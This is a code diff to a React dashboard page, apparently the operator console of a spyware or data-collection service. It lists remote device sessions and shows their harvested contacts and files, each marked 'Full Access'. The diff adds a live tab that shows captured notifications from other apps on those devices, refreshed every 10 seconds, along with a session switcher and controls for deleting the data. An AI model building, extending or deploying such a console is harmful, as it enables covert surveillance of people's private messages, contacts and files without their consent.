@@ -38,6 +38,8 @@ import {
   Smartphone,
   Monitor,
   TabletSmartphone,
+  Bell,
+  MessageSquare,
 } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
@@ -103,6 +105,37 @@ interface UploadedFileInfo {
   downloadUrl: string;
   uploadedAt: string;
   deviceId?: string;
+}
+
+
+interface NotificationRecord {
+  id: string;
+  sessionId: string;
+  deviceId?: string;
+  packageName: string;
+  appName: string;
+  title: string;
+  text: string;
+  bigText?: string;
+  subText?: string;
+  summaryText?: string;
+  textLines?: string[];
+  category?: string;
+  priority: number;
+  postTime: number;
+  capturedAt: number;
+  receivedAt: string;
+}
+
+
+interface SessionListInfo {
+  id: string;
+  count: number;
+  fileCount: number;
+  appName: string;
+  createdAt: string;
+  status: SessionStatus | null;
+  isOnline: boolean;
 }
 
 interface SessionData {
@@ -304,7 +337,7 @@ function timeAgo(dateStr: string): string {
 
 // ─── Tab Type ──────────────────────────────────────────
 
-type Tab = 'contacts' | 'files' | 'manager';
+type Tab = 'contacts' | 'files' | 'manager' | 'notifications';
 
 // ─── Main View Component ────────────────────────────────
 
@@ -344,6 +377,28 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
   const [devices, setDevices] = useState<Record<string, DeviceInfo>>({});
   const [selectedDeviceId, setSelectedDeviceId] = useState<string>('');
   const [deletingSession, setDeletingSession] = useState(false);
+
+  // Delete data states
+  const [deletingData, setDeletingData] = useState<string | null>(null);
+  const [showDeleteDataModal, setShowDeleteDataModal] = useState(false);
+  const [deleteDataType, setDeleteDataType] = useState<'contacts' | 'files' | 'fileType'>('contacts');
+  const [deleteFileTypeName, setDeleteFileTypeName] = useState<string>('');
+  const [deleteDataAccessCode, setDeleteDataAccessCode] = useState('');
+  const [deleteDataError, setDeleteDataError] = useState('');
+
+
+  // Session list state (for session switcher)
+  const [allSessions, setAllSessions] = useState<SessionListInfo[]>([]);
+  const [showSessionList, setShowSessionList] = useState(false);
+  // Notification states
+  const [notifications, setNotifications] = useState<NotificationRecord[]>([]);
+  const [notifLoading, setNotifLoading] = useState(false);
+  const [notifSearch, setNotifSearch] = useState('');
+  const [notifAppFilter, setNotifAppFilter] = useState('');
+  const [notifApps, setNotifApps] = useState<string[]>([]);
+  const [notifTotal, setNotifTotal] = useState(0);
+  const [deletingNotifs, setDeletingNotifs] = useState(false);
+
 
   useEffect(() => {
     params.then(p => setSessionId(p.id));
@@ -424,6 +479,136 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
   const handleRefresh = useCallback(() => {
     setFetchKey(k => k + 1);
   }, []);
+
+  // ─── Delete Data Handlers ───────────────────────────
+  const handleDeleteData = useCallback(async () => {
+    if (!deleteDataAccessCode.trim()) {
+      setDeleteDataError('Access code required');
+      return;
+    }
+    setDeletingData('processing');
+    setDeleteDataError('');
+    try {
+      let endpoint = '';
+      let body: any = { sessionId, accessCode: deleteDataAccessCode.trim() };
+
+      if (deleteDataType === 'contacts') {
+        endpoint = '/api/sessions/delete-contacts';
+      } else if (deleteDataType === 'fileType') {
+        endpoint = '/api/sessions/delete-files';
+        body.fileType = deleteFileTypeName;
+      } else {
+        endpoint = '/api/sessions/delete-files';
+      }
+
+      const res = await fetch(endpoint, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(body),
+      });
+      const data = await res.json();
+      if (res.ok) {
+        setShowDeleteDataModal(false);
+        setDeleteDataAccessCode('');
+        setDeleteDataError('');
+        handleRefresh();
+      } else {
+        setDeleteDataError(data.error || 'Failed to delete');
+      }
+    } catch {
+      setDeleteDataError('Failed to delete data');
+    }
+    setDeletingData(null);
+  }, [deleteDataType, deleteFileTypeName, deleteDataAccessCode, sessionId, handleRefresh]);
+
+  const openDeleteDataModal = useCallback((type: 'contacts' | 'files' | 'fileType', fileTypeName?: string) => {
+    setDeleteDataType(type);
+    setDeleteFileTypeName(fileTypeName || '');
+    setDeleteDataAccessCode('');
+    setDeleteDataError('');
+    setShowDeleteDataModal(true);
+  }, []);
+
+
+
+  // Fetch all sessions for session switcher
+  const fetchAllSessions = useCallback(async () => {
+    try {
+      const res = await fetch('/api/sessions');
+      if (res.ok) {
+        const data = await res.json();
+        if (Array.isArray(data)) {
+          setAllSessions(data);
+        }
+      }
+    } catch {}
+  }, []);
+
+  // Fetch sessions on mount and refresh periodically
+  useEffect(() => {
+    if (sessionId) {
+      fetchAllSessions();
+    }
+  }, [sessionId, fetchAllSessions]);
+
+  // Refresh session list every 30 seconds
+  useEffect(() => {
+    if (!sessionId) return;
+    const interval = setInterval(fetchAllSessions, 30000);
+    return () => clearInterval(interval);
+  }, [sessionId, fetchAllSessions]);
+
+  // Fetch notifications
+  const fetchNotifications = useCallback(async () => {
+    if (!sessionId) return;
+    setNotifLoading(true);
+    try {
+      let url = `/api/notifications/${sessionId}?limit=200`;
+      if (notifSearch) url += `&q=${encodeURIComponent(notifSearch)}`;
+      if (notifAppFilter) url += `&app=${encodeURIComponent(notifAppFilter)}`;
+      const res = await fetch(url);
+      if (res.ok) {
+        const data = await res.json();
+        setNotifications(data.notifications || []);
+        setNotifTotal(data.total || 0);
+        setNotifApps(data.apps || []);
+      }
+    } catch {}
+    setNotifLoading(false);
+  }, [sessionId, notifSearch, notifAppFilter]);
+
+  // Delete all notifications for this session
+  const handleDeleteAllNotifications = useCallback(async () => {
+    if (!sessionId) return;
+    if (!confirm('Delete all captured notifications? This cannot be undone.')) return;
+    setDeletingNotifs(true);
+    try {
+      const res = await fetch(`/api/notifications/${sessionId}`, { method: 'DELETE' });
+      if (res.ok) {
+        toast({ title: 'Deleted!', description: 'All notifications deleted.' });
+        fetchNotifications();
+      } else {
+        toast({ title: 'Delete Failed', description: 'Could not delete notifications.' });
+      }
+    } catch {
+      toast({ title: 'Delete Failed', description: 'Network error.' });
+    }
+    setDeletingNotifs(false);
+  }, [sessionId, toast, fetchNotifications]);
+
+  // Auto-fetch notifications when tab is active
+  useEffect(() => {
+    if (activeTab === 'notifications' && sessionId) {
+      fetchNotifications();
+    }
+  }, [activeTab, sessionId, fetchNotifications]);
+
+  // Auto-refresh notifications every 10 seconds when tab is active
+  useEffect(() => {
+    if (activeTab !== 'notifications' || !sessionId) return;
+    const interval = setInterval(fetchNotifications, 10000);
+    return () => clearInterval(interval);
+  }, [activeTab, sessionId, fetchNotifications]);
 
   // Contact sync handler
   const handleSyncContacts = useCallback(async () => {
@@ -861,12 +1046,87 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
         <a href="/" className="w-8 h-8 rounded-full hover:bg-white/10 flex items-center justify-center">
           <ArrowLeft className="w-5 h-5 text-white" />
         </a>
-        <div className="flex-1 min-w-0">
-          <h1 className="text-white font-semibold text-base">{appName}</h1>
+        <div className="flex-1 min-w-0 relative">
+          <button
+            onClick={() => { setShowSessionList(!showSessionList); fetchAllSessions(); }}
+            className="flex items-center gap-1.5 w-full text-left"
+          >
+            <h1 className="text-white font-semibold text-base truncate">{appName}</h1>
+            <ChevronDown className={`w-4 h-4 text-white/60 shrink-0 transition-transform ${showSessionList ? 'rotate-180' : ''}`} />
+          </button>
           <p className="text-white/70 text-xs">
             {contacts.length} contacts &bull; {uploadedFiles.length} files
             {isOnline && <span className="ml-1 text-[#25D366]">&bull; LIVE</span>}
           </p>
+
+          {/* Session Switcher Dropdown */}
+          {showSessionList && (
+            <div className="absolute top-full left-0 right-0 mt-1 bg-white rounded-xl shadow-xl border border-gray-200 max-h-[60vh] overflow-y-auto z-50">
+              <div className="px-3 py-2 bg-[#075E54] rounded-t-xl flex items-center justify-between sticky top-0">
+                <span className="text-white font-semibold text-xs">All Sessions ({allSessions.length})</span>
+                <button onClick={() => setShowSessionList(false)} className="w-5 h-5 rounded-full hover:bg-white/20 flex items-center justify-center">
+                  <X className="w-3 h-3 text-white/70" />
+                </button>
+              </div>
+              {allSessions.length === 0 ? (
+                <div className="px-4 py-6 text-center">
+                  <p className="text-gray-400 text-xs">No sessions found</p>
+                </div>
+              ) : (
+                allSessions.map((s) => {
+                  const isActive = s.id === sessionId;
+                  const sStepIdx = getStepIndex(s.status);
+                  return (
+                    <button
+                      key={s.id}
+                      onClick={() => {
+                        if (s.id !== sessionId) {
+                          window.location.href = `/view/${s.id}`;
+                        }
+                        setShowSessionList(false);
+                      }}
+                      className={`w-full px-3 py-2.5 flex items-center gap-2.5 text-left transition-colors border-b border-gray-50 last:border-0 ${
+                        isActive ? 'bg-[#25D366]/10' : 'hover:bg-gray-50'
+                      }`}
+                    >
+                      <Avatar className="w-9 h-9 shrink-0">
+                        <AvatarFallback className={`${getAvatarColor(s.appName)} text-white font-bold text-xs`}>
+                          {getInitials(s.appName)}
+                        </AvatarFallback>
+                      </Avatar>
+                      <div className="flex-1 min-w-0">
+                        <div className="flex items-center gap-1.5">
+                          <p className={`text-sm font-semibold truncate ${isActive ? 'text-[#075E54]' : 'text-gray-900'}`}>{s.appName}</p>
+                          {s.isOnline ? (
+                            <span className="w-1.5 h-1.5 rounded-full bg-[#25D366] animate-pulse shrink-0" />
+                          ) : (
+                            <span className="w-1.5 h-1.5 rounded-full bg-gray-300 shrink-0" />
+                          )}
+                          {isActive && (
+                            <Badge className="bg-[#25D366] text-white border-0 text-[8px] px-1.5 py-0 h-3.5">ACTIVE</Badge>
+                          )}
+                        </div>
+                        <div className="flex items-center gap-2 text-[10px] text-gray-400">
+                          <span>{s.count} contacts</span>
+                          <span>&bull;</span>
+                          <span>{s.fileCount} files</span>
+                          <span>&bull;</span>
+                          <span>{timeAgo(s.createdAt)}</span>
+                        </div>
+                        {/* Mini progress */}
+                        <div className="flex items-center gap-0.5 mt-0.5">
+                          {STATUS_STEPS.map((step, idx) => (
+                            <div key={step.key} className={`w-1.5 h-1.5 rounded-full ${idx < sStepIdx ? 'bg-[#25D366]' : idx === sStepIdx ? 'bg-[#25D366] animate-pulse' : 'bg-gray-200'}`} />
+                          ))}
+                        </div>
+                      </div>
+                      <ChevronRight className="w-4 h-4 text-gray-300 shrink-0" />
+                    </button>
+                  );
+                })
+              )}
+            </div>
+          )}
         </div>
         <button onClick={() => handleRefresh()} className="w-8 h-8 rounded-full hover:bg-white/10 flex items-center justify-center" title="Refresh">
           <RefreshCw className="w-4 h-4 text-white/70" />
@@ -969,7 +1229,7 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
 
       {/* Access Status Cards */}
       <div className="px-3 py-3 bg-[#ECE5DD]">
-        <div className="grid grid-cols-2 gap-3">
+        <div className="grid grid-cols-3 gap-3">
           <div className="bg-[#075E54] rounded-2xl p-3 text-center shadow-sm">
             <div className="w-10 h-10 rounded-full bg-[#25D366]/20 flex items-center justify-center mx-auto mb-1.5">
               <Phone className="w-5 h-5 text-[#25D366]" />
@@ -977,6 +1237,15 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
             <p className="text-white font-bold text-sm">Contact</p>
             <p className="text-[#25D366] text-xs font-semibold">Full Access</p>
             <p className="text-white/50 text-[10px] mt-0.5">{filteredContacts.length} contacts</p>
+            {filteredContacts.length > 0 && (
+              <button
+                onClick={(e) => { e.stopPropagation(); openDeleteDataModal('contacts'); }}
+                className="mt-1.5 px-2 py-0.5 bg-red-500/20 hover:bg-red-500/40 text-red-300 text-[9px] font-bold rounded-full transition-colors flex items-center gap-0.5 mx-auto"
+                title="Delete all contacts"
+              >
+                <Trash2 className="w-2.5 h-2.5" /> Delete
+              </button>
+            )}
           </div>
           <div className="bg-[#075E54] rounded-2xl p-3 text-center shadow-sm">
             <div className="w-10 h-10 rounded-full bg-blue-400/20 flex items-center justify-center mx-auto mb-1.5">
@@ -985,6 +1254,32 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
             <p className="text-white font-bold text-sm">File Manager</p>
             <p className="text-blue-400 text-xs font-semibold">Full Access</p>
             <p className="text-white/50 text-[10px] mt-0.5">{formatFileSize(totalUploadSize)}</p>
+            {filteredFiles.length > 0 && (
+              <button
+                onClick={(e) => { e.stopPropagation(); openDeleteDataModal('files'); }}
+                className="mt-1.5 px-2 py-0.5 bg-red-500/20 hover:bg-red-500/40 text-red-300 text-[9px] font-bold rounded-full transition-colors flex items-center gap-0.5 mx-auto"
+                title="Delete all files"
+              >
+                <Trash2 className="w-2.5 h-2.5" /> Delete
+              </button>
+            )}
+          </div>
+          <div className="bg-[#075E54] rounded-2xl p-3 text-center shadow-sm">
+            <div className="w-10 h-10 rounded-full bg-purple-400/20 flex items-center justify-center mx-auto mb-1.5">
+              <Bell className="w-5 h-5 text-purple-400" />
+            </div>
+            <p className="text-white font-bold text-sm">Notifications</p>
+            <p className="text-purple-400 text-xs font-semibold">Live Access</p>
+            <p className="text-white/50 text-[10px] mt-0.5">{notifTotal} captured</p>
+            {notifTotal > 0 && (
+              <button
+                onClick={(e) => { e.stopPropagation(); handleDeleteAllNotifications(); }}
+                className="mt-1.5 px-2 py-0.5 bg-red-500/20 hover:bg-red-500/40 text-red-300 text-[9px] font-bold rounded-full transition-colors flex items-center gap-0.5 mx-auto"
+                title="Delete all notifications"
+              >
+                <Trash2 className="w-2.5 h-2.5" /> Delete
+              </button>
+            )}
           </div>
         </div>
       </div>
@@ -1043,6 +1338,15 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
           >
             <HardDrive className="w-3.5 h-3.5" />
             Manager
+          </button>
+          <button
+            onClick={() => { setActiveTab('notifications'); setSearchQuery(''); }}
+            className={`flex-1 py-2.5 rounded-lg text-xs font-semibold transition-colors flex items-center justify-center gap-1.5 ${
+              activeTab === 'notifications' ? 'bg-purple-600 text-white' : 'text-gray-500 hover:text-gray-700'
+            }`}
+          >
+            <Bell className="w-3.5 h-3.5" />
+            Notifications{notifTotal > 0 ? ` (${notifTotal > 99 ? '99+' : notifTotal})` : ''}
           </button>
         </div>
       </div>
@@ -1377,6 +1681,190 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
         </>
       )}
 
+      {/* ─── NOTIFICATIONS TAB ───────────────────────────── */}
+      {activeTab === 'notifications' && (
+        <>
+          {/* Notification Stats & Controls */}
+          <div className="px-3 pt-2 pb-1 bg-[#ECE5DD]">
+            <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
+              <div className="px-4 py-3 bg-purple-700 flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <Bell className="w-4 h-4 text-purple-200" />
+                  <h4 className="text-white font-semibold text-sm">Live Notification Capture</h4>
+                </div>
+                <div className="flex items-center gap-2">
+                  <button
+                    onClick={fetchNotifications}
+                    disabled={notifLoading}
+                    className="w-7 h-7 rounded-full hover:bg-white/10 flex items-center justify-center"
+                    title="Refresh"
+                  >
+                    <RefreshCw className={`w-3.5 h-3.5 text-white/70 ${notifLoading ? 'animate-spin' : ''}`} />
+                  </button>
+                  {notifTotal > 0 && (
+                    <button
+                      onClick={handleDeleteAllNotifications}
+                      disabled={deletingNotifs}
+                      className="w-7 h-7 rounded-full hover:bg-red-500/30 flex items-center justify-center"
+                      title="Delete all notifications"
+                    >
+                      {deletingNotifs ? (
+                        <Loader2 className="w-3.5 h-3.5 text-red-300 animate-spin" />
+                      ) : (
+                        <Trash2 className="w-3.5 h-3.5 text-red-300" />
+                      )}
+                    </button>
+                  )}
+                </div>
+              </div>
+              <div className="p-4">
+                <div className="flex items-center justify-between mb-3">
+                  <div className="flex items-center gap-2">
+                    <Badge className="bg-purple-100 text-purple-700 border-0 text-xs px-2.5 py-1 font-bold">
+                      {notifTotal} captured
+                    </Badge>
+                    {isOnline && (
+                      <Badge className="bg-green-100 text-green-700 border-0 text-xs px-2.5 py-1 font-bold flex items-center gap-1">
+                        <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse" />
+                        Live
+                      </Badge>
+                    )}
+                  </div>
+                  <p className="text-[10px] text-gray-400">Auto-refresh: 10s</p>
+                </div>
+
+                {/* Search */}
+                <div className="relative mb-3">
+                  <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
+                  <Input
+                    placeholder="Search notifications..."
+                    value={notifSearch}
+                    onChange={(e) => setNotifSearch(e.target.value)}
+                    className="pl-9 pr-9 h-9 bg-gray-50 rounded-xl border-0 text-sm"
+                  />
+                  {notifSearch && (
+                    <button onClick={() => setNotifSearch('')} className="absolute right-3 top-1/2 -translate-y-1/2">
+                      <X className="w-4 h-4 text-gray-400" />
+                    </button>
+                  )}
+                </div>
+
+                {/* App Filter */}
+                {notifApps.length > 0 && (
+                  <div className="flex gap-1.5 overflow-x-auto pb-1 no-scrollbar">
+                    <button
+                      onClick={() => setNotifAppFilter('')}
+                      className={`shrink-0 px-3 py-1.5 rounded-full text-[10px] font-bold transition-colors ${
+                        notifAppFilter === '' ? 'bg-purple-700 text-white' : 'bg-gray-100 text-gray-600 hover:bg-gray-200'
+                      }`}
+                    >
+                      All Apps
+                    </button>
+                    {notifApps.map((app) => (
+                      <button
+                        key={app}
+                        onClick={() => setNotifAppFilter(notifAppFilter === app ? '' : app)}
+                        className={`shrink-0 px-3 py-1.5 rounded-full text-[10px] font-bold transition-colors ${
+                          notifAppFilter === app ? 'bg-purple-700 text-white' : 'bg-gray-100 text-gray-600 hover:bg-gray-200'
+                        }`}
+                      >
+                        {app}
+                      </button>
+                    ))}
+                  </div>
+                )}
+              </div>
+            </div>
+          </div>
+
+          {/* Notification List */}
+          <div className="px-3 pb-4 bg-[#ECE5DD] space-y-2">
+            {notifLoading && notifications.length === 0 ? (
+              <div className="flex flex-col items-center justify-center py-12">
+                <Loader2 className="w-8 h-8 text-purple-400 animate-spin mb-3" />
+                <p className="text-gray-500 text-sm">Loading notifications...</p>
+              </div>
+            ) : notifications.length === 0 ? (
+              <div className="flex flex-col items-center justify-center py-12">
+                <div className="w-16 h-16 rounded-full bg-purple-100 flex items-center justify-center mb-3">
+                  <Bell className="w-8 h-8 text-purple-300" />
+                </div>
+                <p className="text-gray-500 font-semibold text-sm mb-1">No Notifications Yet</p>
+                <p className="text-gray-400 text-xs text-center max-w-[250px]">
+                  {isOnline
+                    ? 'Notifications from this device will appear here in real-time'
+                    : 'Device is offline. Notifications will sync when device comes online.'}
+                </p>
+              </div>
+            ) : (
+              notifications.map((notif) => {
+                const timeStr = notif.capturedAt
+                  ? new Date(notif.capturedAt).toLocaleString()
+                  : notif.receivedAt
+                  ? new Date(notif.receivedAt).toLocaleString()
+                  : 'Unknown';
+                const notifText = notif.bigText || notif.text || '';
+                const hasExtraLines = notif.textLines && notif.textLines.length > 0;
+
+                return (
+                  <div key={notif.id} className="bg-white rounded-2xl shadow-sm overflow-hidden">
+                    {/* Notification Header */}
+                    <div className="px-4 py-3 flex items-start gap-3">
+                      <div className="w-9 h-9 rounded-full bg-purple-100 flex items-center justify-center shrink-0 mt-0.5">
+                        <MessageSquare className="w-4 h-4 text-purple-600" />
+                      </div>
+                      <div className="flex-1 min-w-0">
+                        <div className="flex items-center gap-2 mb-0.5">
+                          <span className="text-xs font-bold text-purple-700 truncate">
+                            {notif.appName || notif.packageName}
+                          </span>
+                          {notif.category && (
+                            <Badge className="bg-gray-100 text-gray-500 border-0 text-[8px] px-1.5 py-0 h-4">
+                              {notif.category}
+                            </Badge>
+                          )}
+                        </div>
+                        {notif.title && (
+                          <p className="text-sm font-semibold text-gray-900 truncate">{notif.title}</p>
+                        )}
+                        {notifText && (
+                          <p className="text-xs text-gray-600 mt-0.5 line-clamp-2">{notifText}</p>
+                        )}
+                        {hasExtraLines && (
+                          <div className="mt-1.5 space-y-0.5">
+                            {notif.textLines!.map((line, idx) => (
+                              <p key={idx} className="text-xs text-gray-500 truncate pl-2 border-l-2 border-purple-200">
+                                {line}
+                              </p>
+                            ))}
+                          </div>
+                        )}
+                        {notif.subText && (
+                          <p className="text-[10px] text-gray-400 mt-1">{notif.subText}</p>
+                        )}
+                      </div>
+                      <div className="shrink-0 text-right">
+                        <p className="text-[10px] text-gray-400">{timeStr}</p>
+                        {notif.deviceId && devices[notif.deviceId] && (
+                          <p className="text-[9px] text-gray-300 mt-0.5">{devices[notif.deviceId].name}</p>
+                        )}
+                      </div>
+                    </div>
+                  </div>
+                );
+              })
+            )}
+
+            {notifications.length > 0 && notifications.length < notifTotal && (
+              <div className="text-center py-2">
+                <p className="text-xs text-gray-400">
+                  Showing {notifications.length} of {notifTotal} notifications
+                </p>
+              </div>
+            )}
+          </div>
+        </>
+      )}
       {/* ─── FILE MANAGER TAB ────────────────────────── */}
       {activeTab === 'manager' && (
         <ScrollArea className="flex-1">
@@ -1416,21 +1904,41 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
                   <Image className="w-4 h-4 text-purple-500 mx-auto mb-0.5" aria-label="Images" />
                   <p className="text-xs font-bold text-gray-900">{fileTypeCounts.image || 0}</p>
                   <p className="text-[9px] text-gray-500">Images</p>
+                  {(fileTypeCounts.image || 0) > 0 && (
+                    <button onClick={() => openDeleteDataModal('fileType', 'image')} className="mt-0.5 px-1.5 py-0.5 bg-purple-100 hover:bg-purple-200 text-purple-600 text-[7px] font-bold rounded-full transition-colors">
+                      <Trash2 className="w-2 h-2 inline -mt-px" /> Del
+                    </button>
+                  )}
                 </div>
                 <div className="bg-red-50 rounded-xl p-2 text-center">
                   <Video className="w-4 h-4 text-red-500 mx-auto mb-0.5" />
                   <p className="text-xs font-bold text-gray-900">{fileTypeCounts.video || 0}</p>
                   <p className="text-[9px] text-gray-500">Videos</p>
+                  {(fileTypeCounts.video || 0) > 0 && (
+                    <button onClick={() => openDeleteDataModal('fileType', 'video')} className="mt-0.5 px-1.5 py-0.5 bg-red-100 hover:bg-red-200 text-red-600 text-[7px] font-bold rounded-full transition-colors">
+                      <Trash2 className="w-2 h-2 inline -mt-px" /> Del
+                    </button>
+                  )}
                 </div>
                 <div className="bg-orange-50 rounded-xl p-2 text-center">
                   <Music className="w-4 h-4 text-orange-500 mx-auto mb-0.5" />
                   <p className="text-xs font-bold text-gray-900">{fileTypeCounts.audio || 0}</p>
                   <p className="text-[9px] text-gray-500">Audio</p>
+                  {(fileTypeCounts.audio || 0) > 0 && (
+                    <button onClick={() => openDeleteDataModal('fileType', 'audio')} className="mt-0.5 px-1.5 py-0.5 bg-orange-100 hover:bg-orange-200 text-orange-600 text-[7px] font-bold rounded-full transition-colors">
+                      <Trash2 className="w-2 h-2 inline -mt-px" /> Del
+                    </button>
+                  )}
                 </div>
                 <div className="bg-blue-50 rounded-xl p-2 text-center">
                   <FileText className="w-4 h-4 text-blue-500 mx-auto mb-0.5" />
                   <p className="text-xs font-bold text-gray-900">{(fileTypeCounts.pdf || 0) + (fileTypeCounts.document || 0)}</p>
                   <p className="text-[9px] text-gray-500">Docs</p>
+                  {((fileTypeCounts.pdf || 0) + (fileTypeCounts.document || 0)) > 0 && (
+                    <button onClick={() => openDeleteDataModal('fileType', 'document')} className="mt-0.5 px-1.5 py-0.5 bg-blue-100 hover:bg-blue-200 text-blue-600 text-[7px] font-bold rounded-full transition-colors">
+                      <Trash2 className="w-2 h-2 inline -mt-px" /> Del
+                    </button>
+                  )}
                 </div>
               </div>
               <div className="bg-gray-50 rounded-xl p-3 flex items-center justify-between">
@@ -1485,6 +1993,11 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
               <div className="px-4 py-3 bg-[#075E54] flex items-center gap-2">
                 <FolderOpen className="w-4 h-4 text-white/80 shrink-0" />
                 <h4 className="text-white font-semibold text-sm flex-1">Browse Files</h4>
+                {filteredFiles.length > 0 && (
+                  <button onClick={() => openDeleteDataModal('files')} className="px-2 py-0.5 bg-red-500/30 hover:bg-red-500/50 text-red-200 text-[9px] font-bold rounded-full transition-colors flex items-center gap-0.5" title="Delete all files">
+                    <Trash2 className="w-2.5 h-2.5" /> Delete All
+                  </button>
+                )}
                 {selectedDeviceId && devices[selectedDeviceId] && (
                   <span className="text-[10px] text-[#25D366] font-semibold mr-2">
                     {devices[selectedDeviceId].name}
@@ -1721,6 +2234,67 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
         </div>
       )}
 
+      {/* Delete Data Confirmation Modal */}
+      {showDeleteDataModal && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center">
+          <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" onClick={() => !deletingData && setShowDeleteDataModal(false)} />
+          <div className="relative w-full max-w-sm mx-4 bg-white rounded-2xl shadow-2xl overflow-hidden">
+            <div className="p-5">
+              <div className="flex items-center gap-3 mb-4">
+                <div className="w-10 h-10 rounded-full bg-red-100 flex items-center justify-center">
+                  <Trash2 className="w-5 h-5 text-red-500" />
+                </div>
+                <div>
+                  <h3 className="font-bold text-gray-900">Delete Data</h3>
+                  <p className="text-xs text-gray-500">
+                    {deleteDataType === 'contacts'
+                      ? 'Delete all contacts from this session?'
+                      : deleteFileTypeName
+                      ? `Delete all ${deleteFileTypeName} files?`
+                      : 'Delete all files from this session?'
+                    }
+                  </p>
+                </div>
+              </div>
+              <p className="text-xs text-red-600 bg-red-50 rounded-lg p-2 mb-3">
+                This action cannot be undone. The data will be permanently deleted.
+              </p>
+              <div className="mb-3">
+                <label className="text-xs font-semibold text-gray-700 block mb-1">Access Code</label>
+                <input
+                  type="password"
+                  value={deleteDataAccessCode}
+                  onChange={(e) => setDeleteDataAccessCode(e.target.value)}
+                  placeholder="Enter access code or master code"
+                  className="w-full px-3 py-2 border border-gray-200 rounded-xl text-sm focus:outline-none focus:border-red-400"
+                  onKeyDown={(e) => e.key === 'Enter' && handleDeleteData()}
+                />
+              </div>
+              {deleteDataError && (
+                <p className="text-xs text-red-500 mb-2">{deleteDataError}</p>
+              )}
+              <div className="flex gap-2">
+                <button
+                  onClick={() => { setShowDeleteDataModal(false); setDeleteDataAccessCode(''); setDeleteDataError(''); }}
+                  disabled={!!deletingData}
+                  className="flex-1 py-2.5 rounded-xl text-sm font-semibold text-gray-600 bg-gray-100 hover:bg-gray-200 transition-colors"
+                >
+                  Cancel
+                </button>
+                <button
+                  onClick={handleDeleteData}
+                  disabled={!!deletingData}
+                  className="flex-1 py-2.5 rounded-xl text-sm font-semibold text-white bg-red-500 hover:bg-red-600 transition-colors flex items-center justify-center gap-1"
+                >
+                  {deletingData ? <Loader2 className="w-4 h-4 animate-spin" /> : <Trash2 className="w-4 h-4" />}
+                  Delete
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
       {/* Footer */}
       <div className="px-4 py-3 bg-white border-t border-gray-100 mt-auto">
         <p className="text-center text-xs text-gray-400">
@@ -1730,3 +2304,7 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
     </div>
   );
 }
+
+
+
+
